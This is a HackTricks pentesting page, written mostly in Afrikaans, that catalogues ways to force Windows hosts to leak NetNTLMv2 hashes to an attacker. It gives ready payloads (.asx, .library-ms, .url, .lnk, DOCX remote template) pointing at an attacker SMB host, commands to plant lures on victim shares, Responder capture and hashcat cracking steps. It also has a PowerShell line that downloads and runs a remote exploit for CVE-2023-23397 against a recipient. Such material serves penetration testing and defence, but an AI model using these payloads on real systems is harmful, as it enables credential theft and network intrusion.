# Plekke om NTLM creds te steel

{{#include ../../banners/hacktricks-training.md}}

**Kyk na al die goeie idees van [https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/) van die aflaai van 'n microsoft word-lêer aanlyn tot die ntlm leaks-bron: https://github.com/soufianetahiri/TeamsNTLMLeak/blob/main/README.md en [https://github.com/p0dalirius/windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)**

### Skryfbare SMB share + Explorer-triggered UNC lures (ntlm_theft/SCF/LNK/library-ms/desktop.ini)

Indien jy na 'n share kan skryf wat gebruikers of geskeduleerde take in Explorer deurblaai, plaas lêers waarvan die metadata na jou UNC wys (bv. `\\ATTACKER\share`). Wanneer die gids vertoon word, trigger dit implicit SMB authentication en leaks 'n NetNTLMv2 na jou listener.

1. **Genereer lokmiddels** (omvat SCF/URL/LNK/library-ms/desktop.ini/Office/RTF/etc.)
```bash
git clone https://github.com/Greenwolf/ntlm_theft && cd ntlm_theft
uv add --script ntlm_theft.py xlsxwriter
uv run ntlm_theft.py -g all -s <attacker_ip> -f lure
```
2. **Plaas hulle op die skryfbare share** (enige gids wat die slagoffer oopmaak):
```bash
smbclient //victim/share -U 'guest%'
cd transfer\
prompt off
mput lure/*
```
3. **Listen and crack**:
```bash
sudo responder -I <iface>          # capture NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt  # autodetects mode 5600
```
Windows kan verskeie lêers gelyktydig aanspreek; alles wat Explorer vooraf besigtig (`BROWSE TO FOLDER`) vereis geen klikke nie.

### Windows Media Player-speellyste (.ASX/.WAX)

As jy 'n teiken kan kry om 'n Windows Media Player-speellys wat jy beheer te open of vooraf te besigtig, kan jy leak Net‑NTLMv2 deur die inskrywing na 'n UNC path te wys. WMP sal probeer om die verwysde media oor SMB te haal en sal implisiet verifieer.

Example payload:
```xml
<asx version="3.0">
<title>Leak</title>
<entry>
<title></title>
<ref href="file://ATTACKER_IP\\share\\track.mp3" />
</entry>
</asx>
```
Versameling en cracking-vloei:
```bash
# Capture the authentication
sudo Responder -I <iface>

# Crack the captured NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
```
### ZIP-ingesluit .library-ms NTLM leak (CVE-2025-24071/24055)

Windows Explorer hanteer .library-ms-lêers onveilig wanneer hulle direk vanuit 'n ZIP-argief oopgemaak word. Indien die library-definisie na 'n afgeleë UNC-pad wys (bv. \\attacker\share), veroorsaak slegs die blaai/lansering van die .library-ms binne die ZIP dat Explorer die UNC verken en NTLM-verifikasie na die aanvaller uitstuur. Dit lewer 'n NetNTLMv2 op wat offline gekraak kan word of moontlik gerelaye word.

Minimale .library-ms wat na 'n aanvaller-UNC wys
```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<version>6</version>
<name>Company Documents</name>
<isLibraryPinned>false</isLibraryPinned>
<iconReference>shell32.dll,-235</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<simpleLocation>
<url>\\10.10.14.2\share</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```
Operasionele stappe
- Skep die .library-ms-lêer met die XML hierbo (stel jou IP/hostname in).
- Pak dit in 'n ZIP (on Windows: Send to → Compressed (zipped) folder) en lewer die ZIP aan die teiken.
- Start 'n NTLM capture listener en wag dat die slagoffer die .library-ms van binne die ZIP open.


### Outlook calendar reminder sound path (CVE-2023-23397) – zero‑click Net‑NTLMv2 leak

Microsoft Outlook for Windows het die uitgebreide MAPI-eiendom PidLidReminderFileParameter in kalenderitems verwerk. As daardie eiendom na 'n UNC-pad verwys (bv. \\attacker\share\alert.wav), sou Outlook die SMB share kontak wanneer die herinnering afgaan, en die gebruiker se Net‑NTLMv2 leak sonder enige klik. Dit is op 14 Maart 2023 gepatch, maar dit is steeds hoogs relevant vir legacy of onopgedateerde vloten en vir historiese incident response.

Quick exploitation with PowerShell (Outlook COM):
```powershell
# Run on a host with Outlook installed and a configured mailbox
IEX (iwr -UseBasicParsing https://raw.githubusercontent.com/api0cradle/CVE-2023-23397-POC-Powershell/main/CVE-2023-23397.ps1)
Send-CalendarNTLMLeak -recipient user@example.com -remotefilepath "\\10.10.14.2\share\alert.wav" -meetingsubject "Update" -meetingbody "Please accept"
# Variants supported by the PoC include \\host@80\file.wav and \\host@SSL@443\file.wav
```
Luisteraarkant:
```bash
sudo responder -I eth0  # or impacket-smbserver to observe connections
```
Aantekeninge
- ’n slagoffer hoef slegs Outlook for Windows te hê wat loop wanneer die herinnering afgaan.
- Die leak lewer Net‑NTLMv2 wat geskik is vir offline cracking of relay (nie pass‑the‑hash nie).


### .LNK/.URL ikoon‑gebaseerde zero‑click NTLM leak (CVE‑2025‑50154 – bypass of CVE‑2025‑24054)

Windows Explorer vertoon snelkoppeling‑ikone outomaties. Onlangse navorsing het getoon dat selfs ná Microsoft se April 2025 patch vir UNC‑icon snelkoppelinge dit steeds moontlik was om NTLM‑verifikasie sonder klikke te aktiveer deur die snelkoppeling‑doel op ’n UNC‑pad te host en die ikoon lokaal te hou (patch bypass toegeken CVE‑2025‑50154). Slegs die bekyk van die vouer veroorsaak dat Explorer metadata van die afgeleë bestemming aflaai en NTLM na die aanvaller se SMB‑bediener uitstuur.

Minimale Internet Shortcut payload (.url):
```ini
[InternetShortcut]
URL=http://intranet
IconFile=\\10.10.14.2\share\icon.ico
IconIndex=0
```
Program-snelkoppeling payload (.lnk) deur PowerShell:
```powershell
$lnk = "$env:USERPROFILE\Desktop\lab.lnk"
$w = New-Object -ComObject WScript.Shell
$sc = $w.CreateShortcut($lnk)
$sc.TargetPath = "\\10.10.14.2\share\payload.exe"  # remote UNC target
$sc.IconLocation = "C:\\Windows\\System32\\SHELL32.dll" # local icon to bypass UNC-icon checks
$sc.Save()
```
Delivery ideas
- Plaas die shortcut in 'n ZIP en kry die slagoffer om dit te blaai.
- Plaas die shortcut op 'n skryfbare share wat die slagoffer sal open.
- Kombineer dit met ander loklêers in dieselfde gids sodat Explorer die items voorskou.


### Office remote template injection (.docx/.dotm) om NTLM af te dwing

Office-dokumente kan na 'n eksterne template verwys. As jy die aangehegte template op 'n UNC path stel, sal die opening van die dokument teen SMB autentikeer.

Minimale DOCX relationship-wijzigings (binne word/):

1) Wysig word/settings.xml en voeg die aangehegte template-verwysing by:
```xml
<w:attachedTemplate r:id="rId1337" xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"/>
```
2) Wysig word/_rels/settings.xml.rels en wys rId1337 na jou UNC:
```xml
<Relationship Id="rId1337" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="\\\\10.10.14.2\\share\\template.dotm" TargetMode="External" xmlns="http://schemas.openxmlformats.org/package/2006/relationships"/>
```
3) Herpak na .docx en lewer af. Begin jou SMB capture listener en wag vir die opening.

Vir post-capture idees oor relaying of misbruik van NTLM, sien:

{{#ref}}
README.md
{{#endref}}


## Verwysings
- [HTB: Breach – Writable share lures + Responder capture → NetNTLMv2 crack → Kerberoast svc_mssql](https://0xdf.gitlab.io/2026/02/10/htb-breach.html)
- [HTB Fluffy – ZIP .library‑ms auth leak (CVE‑2025‑24071/24055) → GenericWrite → AD CS ESC16 to DA (0xdf)](https://0xdf.gitlab.io/2025/09/20/htb-fluffy.html)
- [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [Morphisec – 5 NTLM vulnerabilities: Unpatched privilege escalation threats in Microsoft](https://www.morphisec.com/blog/5-ntlm-vulnerabilities-unpatched-privilege-escalation-threats-in-microsoft/)
- [MSRC – Microsoft mitigates Outlook EoP (CVE‑2023‑23397) and explains the NTLM leak via PidLidReminderFileParameter](https://www.microsoft.com/en-us/msrc/blog/2023/03/microsoft-mitigates-outlook-elevation-of-privilege-vulnerability/)
- [Cymulate – Zero‑click, one NTLM: Microsoft security patch bypass (CVE‑2025‑50154)](https://cymulate.com/blog/zero-click-one-ntlm-microsoft-security-patch-bypass-cve-2025-50154/)


{{#include ../../banners/hacktricks-training.md}}
